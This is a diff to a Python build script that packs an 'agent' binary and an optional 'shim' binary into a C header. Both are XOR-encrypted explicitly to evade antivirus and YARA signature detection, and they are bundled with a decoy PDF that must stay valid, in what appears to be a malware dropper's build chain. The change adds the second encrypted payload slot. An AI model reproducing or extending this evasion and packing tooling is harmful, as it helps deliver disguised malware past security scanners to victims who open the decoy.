@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
-"""Convert two binary files to a C header with AGENT_BINARY and DECOY_DATA arrays.
+"""Convert binary files to a C header with AGENT_BINARY, SHIM_BINARY, and DECOY_DATA arrays.
 
-The agent binary is XOR-encrypted before embedding to defeat static AV/YARA
+The agent and shim binaries are XOR-encrypted before embedding to defeat static AV/YARA
 signature matching. The decoy PDF is stored as-is (must remain a valid document).
 
-Usage: bin2header.py [--key <hex_key>] <agent_binary> <decoy_file> <output_header>
+Usage: bin2header.py [--key <hex_key>] <agent_binary> [<shim_binary>] <decoy_file> <output_header>
+If shim_binary is 'none' or omitted, only AGENT_BINARY and DECOY_DATA are emitted.
 """
 
 import sys
@@ -46,12 +47,15 @@ def main():
     parser.add_argument("--key", type=str, default=None,
                         help="XOR encryption key as hex string (e.g. 2B7E151628AED2A6)")
     parser.add_argument("agent_binary", help="Path to the compiled agent binary")
+    parser.add_argument("shim_binary", nargs='?', default='none',
+                        help="Path to the compiled shim binary (or 'none')")
     parser.add_argument("decoy_file", help="Path to the decoy PDF")
     parser.add_argument("output_header", help="Path to the output C header file")
 
     args = parser.parse_args()
 
     agent_path = args.agent_binary
+    shim_path = args.shim_binary
     decoy_path = args.decoy_file
     out_path = args.output_header
 
@@ -64,6 +68,15 @@ def main():
         print(f"Error reading agent binary '{agent_path}': {e}", file=sys.stderr)
         sys.exit(1)
 
+    shim_data = b''
+    if shim_path and shim_path != 'none':
+        try:
+            with open(shim_path, 'rb') as f:
+                shim_data = f.read()
+        except (IOError, OSError) as e:
+            print(f"Error reading shim binary '{shim_path}': {e}", file=sys.stderr)
+            sys.exit(1)
+
     try:
         with open(decoy_path, 'rb') as f:
             decoy_data = f.read()
@@ -72,6 +85,7 @@ def main():
         sys.exit(1)
 
     encrypted_agent = _xor_encrypt(agent_data, key)
+    encrypted_shim = _xor_encrypt(shim_data, key) if shim_data else b''
 
     with open(out_path, 'w') as f:
         f.write('#pragma once\n')
@@ -79,6 +93,9 @@ def main():
         f.write('namespace inferno { namespace wrapper {\n')
         _write_array(f, 'AGENT_BINARY', encrypted_agent)
         f.write('\n')
+        if shim_data:
+            _write_array(f, 'SHIM_BINARY', encrypted_shim)
+            f.write('\n')
         # Store the XOR key in the header alongside the ciphertext.
         # The wrapper reads it at compile time for decryption.
         # Always emitted: XOR_KEY_LEN == 0 means decryption is a no-op.
